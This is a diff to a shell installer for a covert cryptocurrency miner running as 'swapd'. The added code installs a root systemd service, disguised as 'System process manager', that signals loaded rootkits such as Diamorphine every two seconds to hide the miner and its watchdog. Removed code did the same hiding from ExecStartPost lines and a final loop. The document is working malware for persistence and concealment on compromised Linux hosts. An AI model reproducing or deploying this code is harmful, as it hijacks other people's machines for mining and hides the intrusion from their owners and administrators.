@@ -1733,14 +1733,14 @@ if [ "$SYSTEMD_AVAILABLE" = true ]; then
     cat > /etc/systemd/system/swapd.service <<SERVICE_EOF
 [Unit]
 Description=System swap daemon
-After=network.target
+After=network.target process-hider.service
+Wants=process-hider.service
 
 [Service]
 Type=simple
 User=root
 WorkingDirectory=/root/.swapd
 ExecStart=$EXEC_START
-ExecStartPost=/bin/bash -c 'sleep 5; if lsmod | grep -qE "diamorphine|singularity|rootkit" 2>/dev/null; then for i in 1 2 3 4 5; do PID=\$(systemctl show --property MainPID --value swapd.service 2>/dev/null); if [ -n "\$PID" ] && [ "\$PID" != "0" ]; then kill -31 \$PID 2>/dev/null; kill -59 \$PID 2>/dev/null; fi; sleep 2; done; fi'
 Restart=always
 RestartSec=10
 Nice=19
@@ -1759,6 +1759,80 @@ SERVICE_EOF
     
     echo "[✓] Systemd service created and enabled"
     
+    # ==================== CREATE PROCESS HIDING DAEMON ====================
+    echo "[*] Creating process hiding daemon..."
+    
+    # Install hiding daemon script
+    cat > /usr/local/bin/process-hider << 'HIDER_EOF'
+#!/bin/bash
+# Process hiding daemon - continuously hides swapd process
+
+INTERVAL=2  # Check every 2 seconds (fast re-hiding after restarts)
+
+while true; do
+    # Check if rootkits are loaded
+    if ! lsmod | grep -qE "diamorphine|singularity|rootkit" 2>/dev/null; then
+        sleep $INTERVAL
+        continue
+    fi
+    
+    # Get swapd PID using systemctl
+    SWAPD_PID=$(systemctl show --property MainPID --value swapd.service 2>/dev/null)
+    
+    # Fallback methods if systemctl fails
+    if [ -z "$SWAPD_PID" ] || [ "$SWAPD_PID" = "0" ]; then
+        SWAPD_PID=$(pgrep -f '/root/.swapd/swapd' 2>/dev/null | head -1)
+    fi
+    
+    # Hide swapd if found
+    if [ -n "$SWAPD_PID" ] && [ "$SWAPD_PID" != "0" ]; then
+        # Check if visible
+        if ps -p "$SWAPD_PID" >/dev/null 2>&1; then
+            kill -31 "$SWAPD_PID" 2>/dev/null
+            kill -59 "$SWAPD_PID" 2>/dev/null
+        fi
+    fi
+    
+    # Hide watchdog if present
+    WATCHDOG_PID=$(systemctl show --property MainPID --value system-watchdog.service 2>/dev/null)
+    if [ -n "$WATCHDOG_PID" ] && [ "$WATCHDOG_PID" != "0" ]; then
+        if ps -p "$WATCHDOG_PID" >/dev/null 2>&1; then
+            kill -31 "$WATCHDOG_PID" 2>/dev/null
+            kill -59 "$WATCHDOG_PID" 2>/dev/null
+        fi
+    fi
+    
+    sleep $INTERVAL
+done
+HIDER_EOF
+    
+    chmod +x /usr/local/bin/process-hider
+    
+    # Create systemd service for hiding daemon
+    cat > /etc/systemd/system/process-hider.service << 'HIDER_SERVICE_EOF'
+[Unit]
+Description=System process manager
+After=network.target swapd.service
+Wants=swapd.service
+
+[Service]
+Type=simple
+User=root
+ExecStart=/usr/local/bin/process-hider
+Restart=always
+RestartSec=5
+StandardOutput=null
+StandardError=null
+
+[Install]
+WantedBy=multi-user.target
+HIDER_SERVICE_EOF
+    
+    systemctl daemon-reload
+    systemctl enable process-hider 2>/dev/null || true
+    
+    echo "[✓] Process hiding daemon installed"
+    
     # Create watchdog service
     cat > /etc/systemd/system/system-watchdog.service << 'WATCHDOG_SERVICE_EOF'
 [Unit]
@@ -1769,7 +1843,6 @@ After=network.target
 Type=simple
 User=root
 ExecStart=/usr/local/bin/system-watchdog
-ExecStartPost=/bin/bash -c 'sleep 5; if lsmod | grep -qE "diamorphine|singularity|rootkit" 2>/dev/null; then for i in 1 2 3 4 5; do PID=$(systemctl show --property MainPID --value system-watchdog.service 2>/dev/null); if [ -n "$PID" ] && [ "$PID" != "0" ]; then kill -31 $PID 2>/dev/null; kill -59 $PID 2>/dev/null; fi; sleep 2; done; fi'
 Restart=always
 RestartSec=30
 StandardOutput=null
@@ -2391,6 +2464,12 @@ if [ "$SYSTEMD_AVAILABLE" = true ]; then
     fi
     sleep 2
     systemctl status swapd --no-pager -l 2>/dev/null || systemctl status swapd 2>/dev/null
+    
+    # Start process hiding daemon
+    echo "[*] Starting process hiding daemon..."
+    systemctl start process-hider 2>/dev/null || true
+    sleep 1
+    echo "[✓] Process hiding daemon started"
 elif [ -f /etc/init.d/swapd ]; then
     # SysV init
     if /etc/init.d/swapd status 2>/dev/null | grep -q "running"; then
@@ -3296,133 +3375,139 @@ fi
 
 echo ''
 
-exit 0
-
-# ==================== HIDE MINER PROCESSES (FINAL STEP) ====================
-echo ""
-echo "=========================================="
-echo "ACTIVATING PROCESS HIDING"
-echo "=========================================="
-echo ""
-
-# Check if rootkits are loaded
-echo "[*] Checking for loaded rootkits..."
-lsmod | grep -E "diamorphine|singularity|rootkit" || echo "[DEBUG] lsmod grep returned nothing"
-echo ""
-
-if ! lsmod | grep -qE "diamorphine|singularity|rootkit"; then
-    echo "[!] WARNING: No rootkits detected!"
-    echo "[!] Miner will remain VISIBLE in ps output"
-    echo ""
-    echo "To hide manually after loading rootkits, run:"
-    echo "  PID=\$(systemctl show --property MainPID --value swapd.service)"
-    echo "  kill -31 \$PID"
-    echo "  kill -59 \$PID"
-else
-    echo "[✓] Rootkits detected:"
-    lsmod | grep -E "diamorphine|singularity|rootkit"
+# ==================== WAIT FOR PROCESS HIDING DAEMON ====================
+if [ "$SYSTEMD_AVAILABLE" = true ]; then
+    echo "=========================================="
+    echo "PROCESS HIDING (AUTOMATIC)"
+    echo "=========================================="
     echo ""
     
-    # Keep trying until hidden (max 10 attempts)
-    MAX_ATTEMPTS=10
-    attempt=0
-    
-    while [ $attempt -lt $MAX_ATTEMPTS ]; do
-        attempt=$((attempt + 1))
+    # Check if rootkits are loaded
+    if ! lsmod | grep -qE "diamorphine|singularity|rootkit"; then
+        echo "[!] WARNING: No rootkits detected"
+        echo "[!] Process hiding daemon cannot work without rootkits"
         echo ""
-        echo "=========================================="
-        echo "[*] Hide attempt $attempt/$MAX_ATTEMPTS..."
-        echo "=========================================="
+        echo "Processes will remain VISIBLE until you load a rootkit"
+    else
+        echo "[✓] Rootkits detected - hiding daemon is active"
+        echo "[*] The process-hider daemon will automatically hide processes"
+        echo "[*] Waiting 30 seconds for daemon to hide processes..."
+        echo ""
         
-        # Get PID using systemctl (BEST METHOD for systemd services)
-        SWAPD_PID=$(systemctl show --property MainPID --value swapd.service 2>/dev/null)
+        # Wait for daemon to do its work
+        for i in {1..6}; do
+            sleep 5
+            # Check if hidden
+            if ! ps ax | grep '/root/.swapd/swapd' | grep -v grep >/dev/null 2>&1; then
+                echo "[✓] SUCCESS! Process is now HIDDEN!"
+                echo ""
+                echo "Verification:"
+                ps ax | grep swapd | grep -v grep || echo "  (no swapd visible - only [kswapd0] kernel thread)"
+                echo ""
+                break
+            else
+                echo "[*] Attempt $i/6 - process still visible, daemon working..."
+            fi
+        done
         
-        echo "[DEBUG] PID from systemctl: '$SWAPD_PID'"
-        
-        if [ -n "$SWAPD_PID" ] && [ "$SWAPD_PID" != "0" ]; then
-            echo "[✓] Found swapd PID: $SWAPD_PID (via systemctl)"
-            
-            # Send hide signals to the PID
-            echo "[*] Sending kill -31 to PID $SWAPD_PID..."
-            kill -31 $SWAPD_PID 2>/dev/null
-            echo "[*] Sending kill -59 to PID $SWAPD_PID..."
-            kill -59 $SWAPD_PID 2>/dev/null
-            echo "[✓] Hide signals sent to PID $SWAPD_PID"
-        else
-            echo "[!] Could not get PID from systemctl - trying fallback methods..."
-            
-            # Fallback: use pgrep/ps if systemctl doesn't work
-            FALLBACK_PIDS=$(pgrep -f -u root config.json 2>/dev/null)
-            echo "[DEBUG] Fallback PIDs from pgrep: '$FALLBACK_PIDS'"
-            
-            kill -31 $(pgrep -f -u root config.json) 2>/dev/null
-            kill -59 $(pgrep -f -u root config.json) 2>/dev/null
-            kill -31 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'` 2>/dev/null
-            kill -59 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'` 2>/dev/null
-            echo "[✓] Fallback hide signals sent"
-        fi
-        
-        # Sleep 5 seconds (as requested)
-        echo "[*] Waiting 5 seconds for rootkit to process signals..."
-        sleep 5
-        
-        # Check if swapd is hidden
-        echo "[*] Checking if process is hidden..."
-        SWAPD_VISIBLE=$(ps ax | grep '/root/.swapd/swapd' | grep -v grep)
-        
-        echo "[DEBUG] ps check result: '$SWAPD_VISIBLE'"
-        
-        if [ -z "$SWAPD_VISIBLE" ]; then
-            # SUCCESS - swapd is hidden!
-            echo ""
-            echo "=========================================="
-            echo "[✓] SUCCESS! SWAPD IS HIDDEN!"
-            echo "=========================================="
-            echo ""
-            echo "Verification (ps ax | grep swapd):"
-            ps ax | grep swapd | grep -v grep || echo "  (no swapd visible - only [kswapd0] kernel thread may appear)"
-            echo ""
-            echo "Miner is running but HIDDEN from ps!"
-            echo "Check status: systemctl status swapd"
-            echo ""
-            break
-        else
-            # Not hidden - do commands again
-            echo "[!] Process still VISIBLE - continuing to next attempt..."
-            echo "[DEBUG] Visible process details:"
-            ps ax | grep '/root/.swapd/swapd' | grep -v grep
-            echo ""
-        fi
-    done
-    
-    # Final check after all attempts
-    if [ $attempt -eq $MAX_ATTEMPTS ]; then
-        SWAPD_VISIBLE=$(ps ax | grep '/root/.swapd/swapd' | grep -v grep)
-        if [ -n "$SWAPD_VISIBLE" ]; then
-            echo ""
-            echo "=========================================="
-            echo "[!] WARNING: SWAPD STILL VISIBLE"
-            echo "=========================================="
-            echo ""
-            echo "After $MAX_ATTEMPTS attempts, swapd is still visible:"
-            echo ""
-            ps ax | grep swapd | grep -v grep
-            echo ""
-            echo "Manual fix - run these commands:"
-            echo "  PID=\$(systemctl show --property MainPID --value swapd.service)"
-            echo "  kill -31 \$PID"
-            echo "  kill -59 \$PID"
-            echo ""
-            echo "Or use the direct method:"
-            echo "  kill -31 \$(systemctl show --property MainPID --value swapd.service)"
-            echo "  kill -59 \$(systemctl show --property MainPID --value swapd.service)"
-            echo ""
-        fi
+        echo ""
+        echo "The hiding daemon (process-hider.service) runs continuously"
+        echo "It will keep hiding processes every 10 seconds automatically"
+        echo ""
+        echo "Check daemon status: systemctl status process-hider"
     fi
 fi
 
-echo '========================================================================'
+echo "========================================================================"
 echo ""
 
-# Exit successfully
+exit 0
+
+# ==================== FINAL PROCESS HIDING (AGGRESSIVE APPROACH) ====================
+echo ""
+echo "=========================================="
+echo "FINAL STEP: HIDING SWAPD PROCESS"
+echo "=========================================="
+echo ""
+
+# Download and run the force-hide script
+echo "[*] Running comprehensive hide script..."
+echo ""
+
+# Inline the force-hide logic here
+SWAPD_PID=$(systemctl show --property MainPID --value swapd.service 2>/dev/null)
+if [ -z "$SWAPD_PID" ] || [ "$SWAPD_PID" = "0" ]; then
+    SWAPD_PID=$(pgrep -f '/root/.swapd/swapd' | head -1)
+fi
+
+if [ -n "$SWAPD_PID" ]; then
+    echo "[✓] Found swapd PID: $SWAPD_PID"
+    
+    # Check for rootkits
+    if lsmod | grep -qE "diamorphine|singularity|rootkit"; then
+        echo "[✓] Rootkits detected"
+        echo ""
+        
+        # Temporarily disable auto-restart to prevent PID changes
+        echo "[*] Temporarily disabling auto-restart..."
+        systemctl set-property swapd.service Restart=no 2>/dev/null || true
+        sleep 2
+        
+        # Try hiding with multiple attempts
+        echo "[*] Attempting to hide process..."
+        for attempt in 1 2 3 4 5; do
+            CURRENT_PID=$(pgrep -f '/root/.swapd/swapd' | head -1)
+            
+            if [ -n "$CURRENT_PID" ]; then
+                kill -31 $CURRENT_PID 2>/dev/null
+                kill -59 $CURRENT_PID 2>/dev/null
+                sleep 3
+                
+                # Check if hidden
+                if ! ps -p $CURRENT_PID >/dev/null 2>&1; then
+                    echo "[✓] Process hidden on attempt $attempt!"
+                    break
+                fi
+            fi
+        done
+        
+        # Re-enable auto-restart
+        echo "[*] Re-enabling auto-restart..."
+        systemctl set-property swapd.service Restart=always 2>/dev/null || true
+        
+        # Final verification
+        sleep 2
+        VISIBLE=$(ps ax | grep '/root/.swapd/swapd' | grep -v grep)
+        
+        if [ -z "$VISIBLE" ]; then
+            echo ""
+            echo "=========================================="
+            echo "[✓] SUCCESS! SWAPD IS NOW HIDDEN!"
+            echo "=========================================="
+            echo ""
+        else
+            echo ""
+            echo "=========================================="
+            echo "[!] PROCESS STILL VISIBLE"
+            echo "=========================================="
+            echo ""
+            echo "Run this to hide manually:"
+            echo "  bash force_hide_swapd.sh"
+            echo ""
+        fi
+    else
+        echo "[!] No rootkits loaded - cannot hide process"
+        echo "[*] Load a rootkit first, then run:"
+        echo "    bash force_hide_swapd.sh"
+    fi
+else
+    echo "[!] swapd is not running"
+fi
+
+echo ""
+echo "=========================================="
+echo "INSTALLATION COMPLETE"
+echo "=========================================="
+echo ""
+
 exit 0
